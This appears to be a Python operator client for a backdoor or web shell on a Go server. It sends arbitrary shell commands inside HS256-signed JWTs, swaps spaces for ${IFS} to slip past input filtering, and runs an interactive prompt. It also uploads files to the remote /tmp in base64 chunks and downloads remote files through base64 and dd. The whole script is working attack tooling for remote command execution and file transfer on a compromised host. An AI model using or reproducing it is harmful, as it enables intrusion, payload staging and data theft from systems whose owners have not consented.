import jwt  # pip install pyjwt
import requests
import base64
import os

# Same secret key as the Go server
SECRET = "changeme"
url = "changeme"

chunk_size = 4096
IFS = "${IFS}"  # Define {IFS}

def run(cmd):
    """Send JWT request to execute remote command"""
    safe_cmd = cmd.replace(" ", IFS)  # Replace all spaces with ${IFS}
    payload = {"cmd": safe_cmd}
    token = jwt.encode(payload, SECRET, algorithm="HS256")
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(url, headers=headers)
    return response.text

def upload(local_file, remote_path):
    print(f"Local Path: {local_file}")
    print(f"Remote Path: {remote_path}")

    """Upload local file to remote /tmp directory in chunks"""
    if not os.path.exists(local_file):
        print("❌ File does not exist!")
        return
    
    # Read the file and encode it to Base64
    with open(local_file, "rb") as f:
        file_data = f.read()
    
    total_chunks = (len(file_data) + chunk_size - 1) // chunk_size  # Calculate the number of chunks

    for i in range(total_chunks):
        chunk = file_data[i * chunk_size : (i + 1) * chunk_size]
        encoded_chunk = base64.b64encode(chunk).decode()  # Base64 encoding

        # Send Base64 chunk, ensure spaces are converted to ${IFS}
        resp = run(f"echo {encoded_chunk}>>{remote_path}.b64")
        print(f"📤 Chunk {i+1}/{total_chunks} sent, server response: {resp}")

    # Decode Base64 and reconstruct the original file
    resp = run(f"base64 -d {remote_path}.b64>{remote_path}")
    resp = run(f"rm {remote_path}.b64")

    print(f"✅ File reconstruction complete, server response: {resp}")

def download(remote_path, local_path):
    print(f"Remote Path: {remote_path}")
    print(f"Local Path: {local_path}")

    # Use a temporary file to save all Base64 encoded content
    temp_b64_file = f"{os.path.basename(remote_path)}.b64"
    remote_temp_b64_file = f"/tmp/{temp_b64_file}"

    if os.path.exists(temp_b64_file):
        print(f"❌ Temporary file {temp_b64_file} exists. Deleting it.")
        os.remove(temp_b64_file)
        
    # Create an empty file
    with open(temp_b64_file, "wb") as temp_file:
        pass

    # Check if remote file exists before proceeding
    resp = run(f"test -f {remote_path}")
    if "No such file" in resp:
        print(f"❌ Remote file {remote_path} does not exist!")
        return

    """Download remote file in chunks to local"""
    resp = run(f"base64 -w 0 {remote_path}>{remote_temp_b64_file}")
    if "No such file" in resp:
        print("❌ Remote file does not exist!")
        return

    # Initialize offset for each chunk
    offset = 0

    while True:
        # Read the next chunk of Base64 data
        chunk = run(f"dd if=\"{remote_temp_b64_file}\" bs={chunk_size} skip={offset} count=1")
        # print(chunk)
        if not chunk.strip():  # Check if chunk is empty, meaning end of file
            break
        
        # Write the chunk to the temporary file
        with open(temp_b64_file, "ab") as temp_file:  # Append mode
            temp_file.write(chunk.encode())

        offset += 1  # Move the offset forward by the chunk size
        print(f"📥 Chunk {offset} downloaded")
            
    print(f"✅ File download complete, temporary file saved to {temp_b64_file}")

    # Decode and write the final file
    with open(local_path, "wb") as local_file:
        with open(temp_b64_file, "rb") as temp_file:
            file_data = temp_file.read()
            local_file.write(base64.b64decode(file_data))  # Decode and write the final file
    
    # Remove temporary files
    # run(f"rm {remote_temp_b64_file}")
    print(f"✅ Download and decode complete, saved to {local_path}")

    
while True:
    cmd = input("> ").strip()
    
    if cmd.startswith("upload "):
        parts = cmd.split(" ", 1)
        if len(parts) == 2:
            local_file = parts[1]
            remote_filename = os.path.basename(local_file)  # Get the file name
            remote_path = f"/tmp/{remote_filename}"  # Save to remote /tmp directory
            upload(local_file, remote_path)
        else:
            print("❌ Incorrect format, please use: upload /path/to/file")
    
    elif cmd.startswith("download "):
        parts = cmd.split(" ", 1)
        if len(parts) == 2:
            remote_file = parts[1]
            local_file = os.path.basename(remote_file)
            download(remote_file, local_file)
        else:
            print("❌ Incorrect format, please use: download /path/to/remote_file")
    
    elif cmd:
        print(run(cmd))
